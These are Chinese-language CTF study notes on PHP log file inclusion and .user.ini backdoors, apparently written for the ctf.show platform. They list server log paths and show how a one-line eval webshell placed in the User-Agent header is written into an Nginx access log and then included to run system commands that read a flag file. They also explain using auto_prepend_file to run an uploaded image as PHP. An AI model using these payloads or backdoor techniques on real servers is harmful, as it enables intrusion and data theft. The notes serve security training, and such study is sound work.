
# 日志文件包含

## Web 服务器日志路径

- **Apache**
    
    - `/var/log/apache2/access.log`
        
    - `/var/log/apache2/error.log`
        
- **Nginx**
    
    - `/var/log/nginx/access.log`
        
    - `/var/log/nginx/error.log`
        

### 系统日志

- `/var/log/messages` （系统通用日志）
    
- `/var/log/syslog` （Debian/Ubuntu 系列系统日志）
    
- `/var/log/auth.log` （登录、认证相关）
    

### PHP 日志

- `/var/log/php_errors.log`（取决于 `php.ini` 的 `error_log` 设置）
    
- 有时直接写在 web 根目录下 `error_log`




本体日志看到如下内容
```
172.12.23.142 - - [03/Oct/2025:15:47:31 +0000] "GET / HTTP/1.1" 200 963 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0" 172.12.23.142 - - [03/Oct/2025:15:47:38 +0000] "POST / HTTP/1.1" 200 1146 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0" 172.12.23.142 - - [03/Oct/2025:15:47:52 +0000] "POST / HTTP/1.1" 200 1140 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0" 172.12.23.142 - - [03/Oct/2025:15:51:33 +0000] "POST / HTTP/1.1" 200 1243 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0" 172.12.23.142 - - [03/Oct/2025:15:53:46 +0000] "GET / HTTP/1.1" 200 963 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" 172.12.23.142 - - [03/Oct/2025:15:53:46 +0000] "GET /favicon.ico HTTP/1.1" 404 200 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" 172.12.23.142 - - [03/Oct/2025:15:54:01 +0000] "POST / HTTP/1.1" 200 1295 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" 172.12.23.142 - - [03/Oct/2025:15:54:11 +0000] "POST / HTTP/1.1" 200 1311 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" 172.12.23.142 - - [03/Oct/2025:15:56:37 +0000] "POST / HTTP/1.1" 200 1051 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" 172.12.23.142 - - [03/Oct/2025:15:59:04 +0000] "POST / HTTP/1.1" 200 1051 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" 172.12.23.142 - - [03/Oct/2025:16:00:54 +0000] "GET / HTTP/1.1" 200 963 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0" 172.12.23.142 - - [03/Oct/2025:16:01:48 +0000] "POST / HTTP/1.1" 200 1126 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" "" 172.12.23.142 - - [03/Oct/2025:16:01:51 +0000] "POST / HTTP/1.1" 200 1126 "https://7a82075d-e877-416d-9e01-21d96caea157.challenge.ctf.show/" ""
```

我们可以看到

`"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36" 

这个东西被包含进来了，这是一个user-agent


所以我们往里写一个<\?php eval($_POST\['shell']);?>


那么一句话木马就会被包含进日志中。

那么我们在传参包含的时候可以把日志包含进来，执行我们的一句话木马，再进行传参，就可以执行我们的shell


↓包含日志中的一句话木马
file=/var/log/nginx/access.log&0={{url(system('cat /var/www/html/flag.php');exit();)}}



# .user.ini

.user.ini
php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。

## 实例
php 配置项中有两个配置可以起到一些作用

```
auto_prepend_file = <filename>         //包含在文件头
auto_append_file = <filename>          //包含在文件尾
```

这两个配置项的作用相当于一个文件包含，比如

```
// .user.ini
auto_prepend_file = 1.jpg
// 1.jpg
<?php phpinfo();?>
// 1.php(任意php文件)

```

满足这三个文件在同一目录下，则相当于在1.php文件里插入了包含语句require('1.png')，进行了文件包含。

另一条配置包含在文件尾，如果遇到了 exit 语句的话就会失效。

.user.ini使用范围很广，不仅限于 Apache 服务器，同样适用于 Nginx 服务器，只要服务器启用了 fastcgi 模式 (通常非线程安全模式使用的就是 fastcgi 模式)。

## 局限
在.user.ini中使用这条配置也说了是在同目录下的其他.php 文件中包含配置中所指定的文件，也就是说需要该目录下存在.php 文件，通常在文件上传中，一般是专门有一个目录用来存在图片，可能小概率会存在.php 文件。

但是有时可以使用 ../ 来将文件上传到其他目录，达到一个利用的效果。
